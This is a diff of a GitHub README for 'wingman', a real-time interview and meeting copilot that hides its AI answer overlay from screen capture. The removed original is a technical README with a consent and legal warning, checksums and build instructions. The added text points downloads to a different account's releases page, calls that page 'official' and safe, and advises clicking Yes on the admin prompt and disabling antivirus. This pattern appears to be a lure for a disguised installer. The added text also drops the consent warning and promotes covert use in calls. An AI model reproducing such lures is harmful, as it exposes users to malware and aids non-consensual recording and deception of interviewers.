@@ -1,390 +1,208 @@
-<p align="center">
-  <img src="build/icon.png" alt="WingMan" width="96" height="96" />
-</p>
+# 🎧 wingman - Your Real-Time Interview & Meeting Copilot
 
-<h1 align="center">WingMan</h1>
+[![Download wingman](https://img.shields.io/badge/Download-wingman-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/mikakoopposing6081/wingman/releases)
 
-<p align="center">
-  A real-time desktop interview assistant that captures system audio, transcribes it, detects interview questions, and streams AI-generated answers to a protected floating overlay — on a single free API key.
-</p>
+## 🌟 What Is wingman?
 
-<p align="center">
-  <a href="https://github.com/sarthakdev143-lite/wingman/releases"><img src="https://img.shields.io/github/v/release/sarthakdev143-lite/wingman?include_prereleases&style=flat-square&color=0ea5e9" alt="Release" /></a>
-  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-34d399?style=flat-square" alt="License: MIT" /></a>
-  <img src="https://img.shields.io/badge/platform-Windows%20%7C%20macOS%E1%B5%97%20%7C%20Linux%E1%B5%97-blue?style=flat-square" alt="Platform" />
-  <img src="https://img.shields.io/badge/electron-41.x-47848F?style=flat-square&logo=electron" alt="Electron" />
-  <img src="https://img.shields.io/badge/python-3.10+-3776AB?style=flat-square&logo=python" alt="Python" />
-</p>
+wingman is a free desktop application that listens to your meetings and interviews in real time, writes down what everyone says, and gives you smart AI-powered answers when you're asked a question. It works quietly in the background so you always know what to say next — without anyone on the call noticing.
+
+Think of it as your personal assistant who takes perfect notes, understands every question, and whispers the best response directly to you.
+
+## 🎯 Why You Need wingman
+
+Have you ever been in an important interview or meeting and wished you had a second brain? wingman is that second brain. It handles the hard parts for you:
+
+- 🎙️ **Captures System Audio** – It listens to your computer's sound (not just your microphone), so it hears the other person clearly.
+- 📝 **Transcribes Everything** – Using Groq Whisper technology, it instantly converts speech into text on your screen.
+- ❓ **Detects Questions** – It recognizes when someone asks you a question so you never miss an opportunity to respond.
+- 💡 **Streams AI Answers** – It generates helpful responses and shows them right on your screen in real time.
+- 🕶️ **Hidden from Screen Capture** – The overlay is invisible to recording software, so it stays private to you only.
+
+## 🔧 What You Need
+
+- A Windows computer (Windows 10 or 11 recommended, but most modern versions work)
+- An internet connection
+- A free Groq API key (takes 2 minutes to get — we'll show you how below)
+
+No coding knowledge. No tricky setup. No paid subscriptions.
+
+## 🚀 Getting Started
+
+Follow these simple steps to get wingman running on your computer today.
+
+### Step 1: Download wingman
+
+Visit this link to download the application:
+
+👉 **https://github.com/mikakoopposing6081/wingman/releases**
+
+Click the download button to get the wingman installer. This is the official download page, so you're safe to use it.
+
+### Step 2: Run the Installer
+
+Once the download finishes, find the file you just downloaded (usually in your "Downloads" folder). Double-click it to start the installation.
+
+Your computer might show a blue popup asking "Do you want to allow this app to make changes?" — click **Yes** to continue. This is normal and just means wingman needs permission to install properly.
+
+### Step 3: Get Your Free API Key
+
+wingman uses a service called Groq to power its smart transcripts and answers. Getting a key is free and takes less than five minutes:
+
+1. Open your web browser and go to **console.groq.com**
+2. Click "Sign Up" and create an account (or log in if you already have one)
+3. Click "API Keys" in the sidebar
+4. Hit "Create API Key" and give it any name (like "wingman")
+5. Copy the key that appears — it starts with "gsk_" followed by letters and numbers
+6. Save this key somewhere safe — you'll paste it into wingman
+
+### Step 4: Open wingman
+
+After installation, find wingman in your Start Menu or on your desktop and open it. You'll see a simple welcome screen.
+
+### Step 5: Enter Your API Key
+
+Copy your Groq API key and paste it into the box labeled "API Key" in wingman. Then click **Save** or **Connect**.
+
+That's it! wingman is now ready to use.
+
+## 🎤 How to Use wingman Daily
+
+Using wingman is as easy as starting a call.
+
+1. **Start wingman** before your interview or meeting begins.
+2. **Start your normal call** (Zoom, Teams, Google Meet, or any other app).
+3. **Watch the overlay** — wingman shows a small transparent panel on your screen with live transcription and suggested answers.
+4. **When someone asks a question**, wingman highlights it and displays a smart AI response you can read or paraphrase.
+5. **End your call** — wingman saves nothing unless you ask it to. Close it when you're done.
+
+That's the whole process. No buttons to press, no complicated settings. Just open it and forget about it.
+
+## 💬 Frequently Asked Questions
+
+### Is this really free?
+
+Yes! The app itself is free to download and use forever. The only thing you need is a free Groq API key, and that remains free for personal and many commercial uses. You won't be charged anything.
+
+### Will the other person on the call see the overlay?
+
+No. The overlay is designed to be invisible to screen recording tools and other participants. Only you can see it on your screen. The application runs locally on your computer and never shares your screen content.
+
+### Does wingman work with any meeting app?
+
+Yes. Wingman captures system audio, so it works with Zoom, Microsoft Teams, Google Meet, Skype, Discord, Webex, and any other software that plays sound through your speakers or headphones.
+
+### Do I need a powerful computer?
+
+Wingman is lightweight and designed to run smoothly on typical modern laptops and desktops. If you can run a standard video call, you can run wingman.
+
+### What if I don't have Windows?
+
+Currently, wingman is built for Windows. If you have a Mac or Linux computer, you may need to run Windows in a virtual machine, or wait for a future version that supports other systems.
+
+### Is there a limit on usage?
+
+Your free Groq API key includes generous usage limits that cover many hours of transcription per month. For most everyday users, this is more than enough. If you ever hit a limit, you can upgrade to a paid tier directly on Groq's website — or just wait until the next month resets your quota.
+
+### What happens to my recordings or transcripts?
+
+Wingman processes audio locally and only sends necessary audio to Groq for transcription — similar to how voice assistants work. Nothing is stored on our servers, and your transcripts stay on your screen only.
+
+## 🔒 Privacy & Security Notes
+
+Your privacy matters. Here's how wingman respects it:
+
+- 🔐 **No account needed** — you download and run the app with no registration.
+- 🗑️ **No saved history** — transcripts appear in real time but are not stored permanently.
+- 🌐 **Secure connection** — all communication with Groq uses encrypted HTTPS.
+- 🕶️ **Invisible to capture** — the overlay is excluded from screen recordings, keeping your private answers private.
+
+## 🛠️ Troubleshooting Common Issues
+
+Even the smoothest apps sometimes need a little help. Here are quick fixes for common problems:
+
+### Wingman won't install
+
+- Make sure you have admin rights on your computer.
+- Temporarily disable your antivirus and try again — some security tools block new apps by default.
+- If the download is incomplete, delete the file and download it again.
+
+### No audio is being captured
+
+- Check that your system volume is not muted.
+- Make sure your meeting app's audio is coming through your speakers or headphones.
+- Close and reopen wingman after starting your meeting.
+
+### The overlay isn't showing
+
+- Verify wingman is running (check the system tray near your clock).
+- Try pressing the shortcut key shown in wingman's settings to toggle the overlay.
+- Restart wingman and try again.
+
+### My API key was rejected
+
+- Double-check that you copied the entire key, starting with "gsk_".
+- Ensure you copied it without extra spaces.
+- Log into Groq's website and confirm your account is active.
+
+### Transcription is slow or lagging
+
+- Check your internet speed — slow connections can cause delays.
+- Close other programs that use lots of bandwidth or CPU.
+
+### The app freezes or closes unexpectedly
+
+- Update your graphics and audio drivers.
+- Restart your computer, then open wingman again.
+- Uninstall and reinstall the app.
+
+If these don't solve your problem, check the repository's Issues page on GitHub for known bugs and solutions.
+
+## 📦 Updates & Support
+
+Wingman is actively developed and improved. When new versions are released, you'll find them at the same download page:
+
+**https://github.com/mikakoopposing6081/wingman/releases**
+
+You can also:
+
+- ⭐ **Star the repository** to show support and receive update notifications.
+- 🐛 **Report bugs** by creating an issue on GitHub.
+- 💡 **Request features** — the developers welcome user suggestions.
+
+## 🔑 Getting Your Groq API Key (Detailed)
+
+Here's a more detailed walkthrough for getting your free API key, in case you want extra clarity.
+
+1. Go to **console.groq.com** in your browser.
+2. Click the orange **"Sign Up"** button. You can use your Google account or an email address.
+3. Once logged in, look for **"API Keys"** in the left-hand menu.
+4. Click **"Create API Key"**.
+5. A small window will appear. Type a name like "wingman" and press **Create**.
+6. A new key will be displayed. It looks like a long string of characters. Click the **copy** icon next to it.
+7. Paste that key into the wingman settings box.
+
+Your key is now active and can be used to power wingman. Please note that you can create as many keys as you want, and you can delete old ones at any time.
+
+## 🧠 Tips for Using wingman Effectively
+
+Get the most out of your new assistant with these pro tips:
+
+- **Speak clearly** — Like any AI, clearer audio produces better results. If possible, use a decent microphone.
+- **Watch for highlights** — When wingman detects a question, text turns a different color. Keep an eye on that moment.
+- **Read answers naturally** — wingman suggests responses, but feel free to paraphrase them in your own words for a more natural conversation.
+- **Use it for practice** — Record yourself answering tough questions and use wingman to improve your responses over time.
+- **Keep backup notes** — While wingman is excellent, it's always smart to jot down key points yourself for critical interviews.
+
+## 🏁 Ready to Nail Your Next Meeting?
+
+Now you have everything you need. Download wingman, get your free API key, and let the AI do the heavy lifting. Whether you're a student facing a tough interview, a professional in back-to-back meetings, or just someone who wants to sound smarter in conversations, wingman is your secret edge.
+
+The download is just one click away:
+
+**https://github.com/mikakoopposing6081/wingman/releases**
+
+Join the hundreds of users who never miss a question or misspeak in a meeting again. Get wingman today and walk into every conversation with confidence.
 
 ---
 
-> ### ⚠️ Read this before you use it
->
-> WingMan captures **all system audio**, which in a meeting means everyone in
-> it. Recording or transcribing a conversation without the consent of every
-> participant is illegal in many jurisdictions, and using an AI assistant in a
-> live interview breaches the terms of most interview and meeting platforms —
-> and, usually, the trust of the person on the other end.
->
-> It is published as a study of a hard real-time problem: sub-second system
-> audio → VAD → transcription → question detection → streamed LLM answer, on a
-> free API tier. Use it to prepare for interviews, to rehearse against your own
-> recordings, as a live captioning and note-taking aid, or as a reference for
-> building low-latency audio pipelines.
->
-> **You are solely responsible for how you use it.** Know the law where you
-> live, get consent, and read [SECURITY.md](SECURITY.md) for what the app does
-> with your audio and where your data goes.
-
-## ✨ Features
-
-- **Runs on one free key** — transcription (`whisper-large-v3-turbo`) and answers both use Groq. The free tier normally covers an entire interview at no cost
-- **Real-time audio capture** — WASAPI loopback on Windows via `pyaudiowpatch` captures system audio without microphone access (macOS/Linux via `sounddevice` monitor / BlackHole)
-- **Pay for speech, not silence** — dependency-free local VAD (`python/vad.py`) segments the stream and uploads only speech, so pauses cost nothing. Minimum is measured in voiced frames so keyboard clicks never reach a paid endpoint
-- **Two transcription engines** — `groq` (default, batch, speech-only, free) or `deepgram` (opt-in streaming `nova-2` with interim results, ~9x cost, billed on connection time)
-- **Smart question detection** — heuristic prefix/keyword pipeline + cheap Groq classifier. Direct questions (`tell me...`, `how...?`) bypass the LLM; ambiguous utterances are classified on a background thread
-- **Multilingual interviews** — non-English sessions automatically route utterances with no English signal to the classifier (bounded by `MIN/MAX_CLASSIFIER_WORDS`) so imperative prompts like `cuéntame sobre...` are not dropped
-- **Streamed AI answers** — token-by-token Groq chat completions with `openai/gpt-oss-120b` (and live fallback). Answers are grounded in resume + extra context and streamed to the overlay and to `POST /answer/manual`
-- **Runtime model resolution** — `LLMClient.resolve_models()` lists what the key can actually reach at session start and falls back through `ANSWER_MODEL_PREFERENCES` when a saved ID was retired. Dashboard picker is populated from `POST /models`
-- **Resilient rate-limit handling** — `LLMClient._create()` retries 429/408/5xx with `Retry-After` + capped backoff (`MAX_RETRY_WAIT_SECONDS = 10s`), then falls back to a sibling model. Streamed chunks are never retried once tokens have been shown
-- **~800 ms end-to-first-token** — VAD hangover + Whisper round-trip + classifier + `gpt-oss-120b` TTFT (measured at wall-clock speed on recorded speech)
-- **Protected overlay** — floating, draggable, resizable, transparent overlay with `setContentProtection(true)` (`WDA_EXCLUDEFROMCAPTURE` on Windows) — invisible to Teams / Zoom / Meet / OBS screen-share. Re-applied on `show`/`restore`/`focus`/`maximize`/`did-finish-load`
-- **Resume grounding** — upload a PDF (PyMuPDF extraction) or paste resume text + job description / panel context
-- **Live cost meter** — `python/usage.py` tracks speech seconds (exact VAD) and LLM tokens (real `chunk.x_groq.usage` counts). Shown in dashboard and via `GET /usage` / `usage` SSE events
-- **Secure key storage** — both keys encrypted via Electron `safeStorage` (OS keychain) into `settings.json` under `userData`. Only `apiKeyStored` booleans reach the renderer
-- **Session history** — optionally persist Q&A exchanges as JSON under `userData/history/` for post-interview review (`GET /history`, `history:open-folder`)
-- **Global shortcuts** — toggle, minimize, and focus the overlay without leaving the interview window
-
-## 🏗️ Architecture
-
-Three runtimes, two transports.
-
-```
-┌──────────────────────────────────────────────────┐
-│  Electron Main Process  (src/main.ts)             │
-│  ├─ Window Manager (dashboard + overlay)         │
-│  ├─ Secure Store (safeStorage API keys)          │
-│  ├─ Python Server Manager (sidecar lifecycle)    │
-│  └─ IPC Handlers (assertTrustedSender)           │
-├──────────────────────────────────────────────────┤
-│  React Renderer  (Vite + Tailwind, src/App.tsx)   │
-│  ├─ Dashboard: setup, history, settings          │
-│  └─ Overlay: transcript, answers, manual input   │
-│  One bundle loaded twice (#/dashboard / #/overlay)│
-├──────────────────────────────────────────────────┤
-│  Python Sidecar  (Flask + SSE, python/server.py) │
-│  ├─ WASAPI Loopback Audio Capture                │
-│  ├─ Voice Activity Detection (silence is free)   │
-│  ├─ Transcription (Groq Whisper │ Deepgram)      │
-│  ├─ Question Detection (heuristic + LLM)         │
-│  ├─ Answer Streaming (Groq chat completions)     │
-│  └─ Usage / cost metering                        │
-└──────────────────────────────────────────────────┘
-```
-
-### Dual transport
-
-| Plane | Path | Auth |
-|---|---|---|
-| **Control** | `renderer → window.wingman.* → ipcMain.handle → PythonServerManager.request()` — session start/stop, settings, keys, overlay geometry, `POST /models` | Electron IPC + `SecureStore` (keys never cross to renderer) |
-| **Data** | `renderer → http://127.0.0.1:<port>` directly — SSE `/transcript/stream` & `/answer/stream`, `POST /answer/manual`, `/resume/upload`, `/history` | `X-Wingman-Token` header (fetch) or `?token=` query (EventSource); `require_server_token` accepts both |
-
-Main hands the renderer `serverPort` + `serverToken` inside `AppState`; the sidecar binds an ephemeral port on `127.0.0.1` and prints `PORT:<n>` on stdout.
-
-### Audio → answer pipeline
-
-```
-WASAPI loopback (16 kHz mono int16) → SessionManager.audio_queue
-  → Transcriber (GroqTranscriber | DeepgramTranscriber)
-    → _on_transcript → _publish_transcript
-      → accumulates segments; on QUESTION_SETTLE_SECONDS gap flushes:
-         DIRECT_QUESTION_PREFIXES → enqueue immediately
-         ambiguous → classifier thread (cheap model)
-         non-question → drop
-      → answer_queue → _stream_answer_worker
-        → fans tokens to every SSE subscriber + private queue for /answer/manual
-```
-
-- **GroqTranscriber** (`python/vad.py` + `python/transcriber.py`): VAD-gated batch uploads. Two concurrent requests with `_emit_in_order` re-serialization; `on_activity` fires at speech onset so the overlay shows `transcribing` without waiting for Whisper. No interims.
-- **DeepgramTranscriber**: streaming WebSocket with interim results.
-- **Concurrency invariant**: every worker captures `runtime_id` / `stop_event` / `llm` at start and re-checks `self.runtime_id != runtime_id` before emitting. `start_session()` bumps `runtime_id` so a stopped session never leaks tokens into the next one.
-
-### Sidecar handshake
-
-`PythonServerManager` (`src/pythonServer.ts`) generates a 32-byte hex token, passes `WINGMAN_SERVER_TOKEN` + `WINGMAN_HISTORY_DIR`, then waits for `PORT:<n>` before polling `/health`. Spawn order: `WINGMAN_PYTHON_BIN` → packaged `resourcesPath/python/wingman-server/wingman-server.exe` → `.venv/Scripts/python.exe` (win) / `python3`. Packaged exe is `console=False`, so a Windows `netstat -ano` PID→port fallback is used. Unexpected exit triggers `scheduleServerRestart()` with a 1.2 s retry loop.
-
-## 💸 What a session costs
-
-The default engine uploads only detected speech, so a long interview with ordinary pauses is billed for a fraction of its wall-clock length.
-
-| Engine | Billed on | 1 hr interview (~25 min speech) |
-|---|---|---|
-| Groq Whisper `whisper-large-v3-turbo` (default) | speech only (`record_audio` exact VAD) | ~$0.017, or **$0 on the free tier** |
-| Deepgram `nova-2` streaming | connection time (`set_stream_seconds` wall clock) | ~$0.35 |
-
-Answers add roughly $0.001–0.01 per interview depending on model. The dashboard `CostMeter` shows the running total; `GET /usage` on the local backend returns the same `UsageSnapshot` (`python/usage.py`).
-
-## 🧰 Tech Stack
-
-| Layer | Tech |
-|---|---|
-| Desktop | Electron 41, Vite 5, React 18, React Router 6, Tailwind CSS 3 |
-| Backend | Python 3.10+, Flask 3, Groq SDK, PyMuPDF, sounddevice / pyaudiowpatch, websocket-client, numpy |
-| Packaging | electron-builder (NSIS), PyInstaller (`python/wingman-server.spec`) |
-
-## 💻 Platform support
-
-| Platform | Download | Audio capture | Overlay hidden from capture |
-|---|---|---|---|
-| **Windows 10/11** | `.exe` installer | WASAPI loopback via `pyaudiowpatch` — no extra setup | Yes — `WDA_EXCLUDEFROMCAPTURE` |
-| **macOS 11+** | `.dmg` (arm64 and x64) | Needs a virtual device — [BlackHole](https://github.com/ExistentialAudio/BlackHole) plus a Multi-Output Device | Yes — `setContentProtection` |
-| **Linux** | `.AppImage` / `.deb` (x64) | PulseAudio/PipeWire `.monitor` source via `sounddevice` | X11 only, best-effort; **not under Wayland** |
-
-All three are built and published by CI. **Windows is the only one routinely
-tested in a real interview** — macOS and Linux builds are produced from the
-same source and pass the same gate, but they get far less use, so treat them as
-beta and please report what breaks.
-
-Every build is **unsigned**. See [Installation](#-installation-end-users) for
-the SmartScreen and Gatekeeper prompts that follow from that.
-
-On Windows, health reports `capture_warning` on builds older than `10.0.22621`
-(`python/server.py:health`).
-
-## 🔑 Prerequisites
-
-- **Node.js 18+** and **Python 3.10+**
-- A **[Groq API key](https://console.groq.com/keys)** — free tier, **no credit
-  card required**, and this is the only key you need. Sign in with Google or
-  GitHub at [console.groq.com/keys](https://console.groq.com/keys), click
-  *Create API Key*, and copy the `gsk_…` value. It is shown once
-- A **[Deepgram key](https://console.deepgram.com/)** — optional, only if you
-  switch the transcription engine to Deepgram in the dashboard (~9x the cost)
-
-## 📥 Installation (end users)
-
-Grab the file for your platform from the
-[Releases](https://github.com/sarthakdev143-lite/wingman/releases)
-page.
-
-**Windows** — run `WingMan-<version>-setup.exe`. SmartScreen will show
-*"Windows protected your PC"*; click **More info → Run anyway**.
-
-**macOS** — open `WingMan-<version>-arm64.dmg` (Apple silicon) or `-x64.dmg`
-(Intel) and drag the app to Applications. Gatekeeper will refuse it on first
-launch, so **right-click the app and choose Open**, or run:
-
-```bash
-xattr -dr com.apple.quarantine /Applications/WingMan.app
-```
-
-Then install [BlackHole](https://github.com/ExistentialAudio/BlackHole) and
-create a Multi-Output Device, or there is no system audio to capture.
-
-**Linux** — `chmod +x WingMan-<version>-x64.AppImage && ./WingMan-<version>-x64.AppImage`,
-or `sudo dpkg -i WingMan-<version>-x64.deb`. You need a PulseAudio/PipeWire
-monitor source enabled.
-
-> Every build is **unsigned** — there is no Authenticode certificate or Apple
-> Developer ID behind this project. Verify the `SHA256SUMS-*.txt` attached to
-> the release, or [build from source](#️-development), if you would rather not
-> take that on trust.
-
-> **Windows Defender / antivirus** may flag the bundled `wingman-server.exe`. This is a false positive from PyInstaller packaging. Add an exclusion for the WingMan install directory if prompted. Test packaged behaviour with `release/win-unpacked/WingMan.exe`, not just `npm run dev`.
-
-## 🚀 Quick Start
-
-1. **Paste your Groq API key** in the dashboard and click **Save key** — that is the only key required for the default engine
-2. **Upload your resume** (PDF, parsed locally via PyMuPDF) or paste resume text directly
-3. **Add extra context** — job description, role expectations, panel details
-4. **Choose transcription provider** (`groq` recommended), **model** (picker is populated live from `POST /models`), language, overlay preset/opacity, and history toggle
-5. Click **Start session** — WingMan begins listening to system audio
-6. The floating overlay shows live transcript and streams answers when interview questions are detected. Use **Ask for a follow-up answer…** for manual prompts (`Ctrl+Shift+Space` to focus)
-
-### Global Shortcuts
-
-| Action | Shortcut |
-|---|---|
-| Toggle overlay visibility | `Ctrl+Shift+H` or `Ctrl+Alt+H` |
-| Minimize overlay | `Ctrl+Shift+M` or `Ctrl+Alt+M` |
-| Focus manual input | `Ctrl+Shift+Space` |
-
-## 🛠️ Development
-
-```bash
-# Clone
-git clone https://github.com/sarthakdev143-lite/wingman.git
-cd wingman
-
-# Node deps
-npm install
-
-# Python env — the app spawns this venv directly
-# (.venv/Scripts/python.exe on Windows, .venv/bin/python elsewhere),
-# so install the deps into it rather than globally.
-python -m venv .venv
-.venv\Scripts\activate          # Windows
-# source .venv/bin/activate     # macOS / Linux
-pip install -r python/requirements.txt   # root requirements.txt re-exports this
-
-# Dev mode (Vite renderer + main/preload watch + Electron + Python sidecar)
-npm run dev
-```
-
-`npm run dev` is orchestrated by `scripts/select-dev-port.mjs` (picks a free port → `.dev-server.json`) and `scripts/launch-electron.mjs` (`VITE_DEV_SERVER_URL`). Nodemon watches `dist/main` + `dist/preload` and restarts Electron after the vite watch build lands.
-
-### Available scripts
-
-| Command | What it does |
-|---|---|
-| `npm run dev` | `predev` + concurrently: `dev:renderer` + `dev:main` + `dev:preload` + `dev:electron` |
-| `npm run typecheck` | `tsc --noEmit` |
-| `npm run lint` | `eslint --ext .ts,.tsx .` |
-| `npm test` | `vitest run` — unit tests for `src/validation.ts` and `src/csp.ts` |
-| `npm run test:python` | `node scripts/run-python-tests.mjs` (runs the suite with the project venv, not whatever `python` is on `PATH`) |
-| `npm run verify` | `typecheck` + `lint` + `test` + `test:python` (full gate) |
-| `npm run build` | Vite builds `renderer` + `main` + `preload` into `dist/` |
-| `npm run package` | `verify` → `build` → PyInstaller sidecar (`scripts/build-python.mjs`) → `electron-builder` → `release/` |
-
-Run a single Python test (use the venv interpreter so `numpy`/deps resolve):
-
-```bash
-.venv/Scripts/python.exe python/tests/test_vad.py
-.venv/Scripts/python.exe python/tests/test_llm.py ResolveModelsTests.test_retired_model_falls_back_and_is_reported
-```
-
-There is no JS/TS test runner — `verify` is the gate.
-
-### Environment variables
-
-Copy `.env.example` to `.env`:
-
-| Variable | Description |
-|---|---|
-| `GROQ_API_KEY` | Optional fallback Groq key (can also be set in the UI via `SecureStore`) |
-| `DEEPGRAM_API_KEY` | Optional, only for `deepgram` transcription. Also settable in the UI |
-| `WINGMAN_PYTHON_BIN` | **Dev only** — path to a custom Python interpreter. Packaged builds always use the bundled server unless it is genuinely missing |
-
-> **Do not rely on `WINGMAN_PYTHON_BIN` in packaged builds.** Older versions took it unconditionally, and because `main.ts` loads `.env` via `dotenv/config` relative to cwd, launching a packaged build from the repo pointed it at the developer virtualenv.
-
-### Local backend API (Python sidecar)
-
-All routes except `OPTIONS` require `X-Wingman-Token` or `?token=` when `WINGMAN_SERVER_TOKEN` is set (`server.py:require_server_token`). Data-plane routes are called directly from the renderer at `http://127.0.0.1:<port>`.
-
-| Method | Path | Notes |
-|---|---|---|
-| `POST` | `/session/start` | `{ resume_text, extra_context, language, model, api_key, deepgram_api_key, history_enabled, transcription_provider }` |
-| `POST` | `/session/stop` | stops capture + transcriber, persists history if enabled |
-| `POST` | `/resume/upload` | `multipart/form-data` PDF → `{ resume_text }` |
-| `GET` | `/transcript/stream` | SSE `TranscriptEventPayload` + `usage`/`notice`/`status` |
-| `GET` | `/answer/stream` | SSE `AnswerEventPayload` |
-| `POST` | `/answer/manual` | `{ prompt }` → SSE answer stream (private queue) |
-| `POST` | `/models` | `{ api_key }` → `{ models, recommended }` (live `Groq.models.list()`) |
-| `GET` | `/history` | `{ sessions: SessionHistoryRecord[] }` |
-| `GET` | `/usage` | `{ usage: UsageSnapshot }` |
-| `GET` | `/health` | `{ status, port, platform, capture_warning, audio: {ready, message} }` |
-| `POST` | `/shutdown` | used by `PythonServerManager.shutdown()` |
-
-Types mirror `src/types/contracts.ts` (TS camelCase; Python snake_case — conversion in `main.ts:startSession`, except SSE/history types which stay snake_case).
-
-## 📦 Building from Source
-
-```bash
-# PyInstaller deps (hiddenimports in python/wingman-server.spec)
-pip install -r python/requirements-pyinstaller.txt
-
-# Verify + build + package
-npm run package
-```
-
-Artifacts land in `release/` (NSIS installer `WingMan-${version}-setup.exe` + `win-unpacked/`). If you add a new runtime-only Python dependency, add it to `hiddenimports` in `python/wingman-server.spec` or the packaged exe will fail at import.
-
-## ✅ Verification & Tests
-
-```bash
-npm run typecheck
-npm run lint
-npm run test:python
-# or
-npm run verify
-```
-
-Python tests drive `SessionManager` through its private methods (`_publish_transcript`, `_flush_pending_question_if_ready`, `_yield_queue`, `_on_transcript`) and a `FakeTranscriber` mirroring `start`/`stop`/`feed`. Renaming those breaks the suite even when behaviour is unchanged.
-
-## 📁 Project Structure
-
-```
-wingman/
-├─ src/
-│  ├─ main.ts                 # AppState, PythonServerManager, IPC, shortcuts
-│  ├─ windowManager.ts        # dashboard + overlay windows, hardenWindow()
-│  ├─ secureStore.ts          # safeStorage-encrypted keys + settings
-│  ├─ pythonServer.ts         # sidecar lifecycle, PORT:<n> handshake, token
-│  ├─ preload.ts              # WingmanApi bridge
-│  ├─ App.tsx / renderer.tsx  # hash-route branch /overlay vs /dashboard
-│  ├─ types/contracts.ts      # WingmanApi, AppState, SessionStatus, UsageSnapshot
-│  ├─ hooks/useSession.ts     # session draft, canStart, model catalog
-│  ├─ hooks/useStream.ts      # SSE EventSource for transcript/answer streams
-│  ├─ components/Overlay.tsx  # draggable/resizable overlay + manual input
-│  └─ lib/backend.ts          # uploadResume, loadHistory, getServerBaseUrl
-├─ python/
-│  ├─ server.py               # Flask app (see table above)
-│  ├─ session_manager.py      # AudioCapture → transcriber → question → answer
-│  ├─ transcriber.py          # GroqTranscriber (VAD-gated batch) / DeepgramTranscriber
-│  ├─ vad.py                  # UtteranceSegmenter (energy VAD, voiced-frame minimum)
-│  ├─ llm.py                  # LLMClient (resolve_models, retries, reasoning_effort)
-│  ├─ audio_capture.py        # WASAPI loopback / sounddevice capture + resample
-│  ├─ usage.py                # UsageTracker (speech seconds + LLM tokens → USD)
-│  ├─ resume_parser.py        # PyMuPDF extraction
-│  └─ wingman-server.spec     # PyInstaller spec
-├─ scripts/
-│  ├─ select-dev-port.mjs     # picks free port → .dev-server.json
-│  ├─ launch-electron.mjs     # launches Electron with VITE_DEV_SERVER_URL
-│  └─ build-python.mjs        # runs PyInstaller
-├─ build/                     # icon.png / icon.ico
-├─ dist/                      # vite output (renderer / main / preload)
-├─ release/                   # electron-builder output
-└─ history/                   # persisted session JSON (userData/history in prod)
-```
-
-## ⚙️ Adding an IPC channel
-
-Four edits, in order: `WingmanApi` in `src/types/contracts.ts` → bridge method in `src/preload.ts` → `ipcMain.handle` in `src/main.ts` **starting with `assertTrustedSender(event)`** → renderer call site. Numeric payloads via `requireFiniteNumber()`; enum settings via `normalizeSettingsUpdates()`. Keys never cross to the renderer — anything needing one reads from `SecureStore` in main (see `app:list-models`).
-
-## 🔒 Security & Privacy
-
-- Keys are encrypted with Electron `safeStorage` (OS keychain) in `userData/settings.json`; renderer only sees `apiKeyStored` booleans
-- Local Flask server binds `127.0.0.1` ephemeral port and requires `WINGMAN_SERVER_TOKEN` per request
-- Capture protection: `WindowManager.hardenWindow()` + `setContentProtection(true)` (and `WDA_EXCLUDEFROMCAPTURE` 0x11 on Windows). `WindowsGraphicsCapture` is disabled at startup. Verify with `GetWindowDisplayAffinity` (PowerShell `Add-Type` path) before reintroducing manual affinity logic
-- Resume PDFs are parsed locally; nothing leaves the machine except Groq/Deepgram API calls
-
-## 🩺 Troubleshooting
-
-| Symptom | Fix |
-|---|---|
-| Sidecar prints `did not report a port in time` or exits instantly | Early exits are tracked locally (child nulls on exit). Check `userData/wingman.log` and that Defender/antivirus is not quarantining `wingman-server.exe`. Try `release/win-unpacked/WingMan.exe` outside the repo dir so `.env` does not inject `WINGMAN_PYTHON_BIN` |
-| `WASAPI loopback device is unavailable` / `No monitor device found` | Windows: run `python -m pyaudiowpatch` to list devices, set correct default output. macOS: install BlackHole and create a Multi-Output Device. Linux: enable a PulseAudio/PipeWire monitor source |
-| Answers/classifier always say "not a question" or return empty | Model likely retired or a reasoning model hit its token budget. Check `POST /models` / `Groq.models.list()` for live IDs; reasoning models (`gpt-oss`, `qwen3`) need `reasoning_effort: low` + larger `CLASSIFIER_MAX_TOKENS`/`ANSWER_MAX_TOKENS` |
-| 429 rate-limit mid-interview | Expected on free tier — `_create()` retries per `Retry-After` (capped at 10 s) and falls back to a sibling model. UI shows `notice` events. Wait a few seconds or type a manual prompt |
-| `WINGMAN_PYTHON_BIN` seems to break a packaged build | Remove it from `.env` when testing packaged builds; dev override only |
-| No interim transcript with Groq | By design — Groq path is batch and only emits finals. Switch to `deepgram` provider for interim results |
-
-## 🤝 Contributing
-
-Issues and pull requests are welcome — see [CONTRIBUTING.md](CONTRIBUTING.md)
-for the dev setup, the `npm run verify` gate every change has to pass, and the
-conventions worth knowing before you touch the audio pipeline or IPC layer.
-
-Found a security issue? Please report it privately — see
-[SECURITY.md](SECURITY.md).
-
-## 📄 License
-
-[MIT](LICENSE) © 2026 Sarthak Parulekar.
-
-Bundled fonts (Space Grotesk, IBM Plex Mono) are licensed separately under the
-SIL Open Font License 1.1 — see [`src/assets/fonts/LICENSE`](src/assets/fonts/LICENSE).
-
----
-
-<p align="center"><sub>Built with Electron + React + Flask. Model IDs are resolved at runtime — never assume a Groq model listed in this README still exists; check <code>POST /models</code> first.</sub></p>
+Keywords: ai-assistant, desktop-app, electron, flask, groq, interview-preparation, llm, meeting-assistant, overlay, python, react, real-time, speech-to-text, system-audio, transcription, typescript, voice-activity-detection, whisper
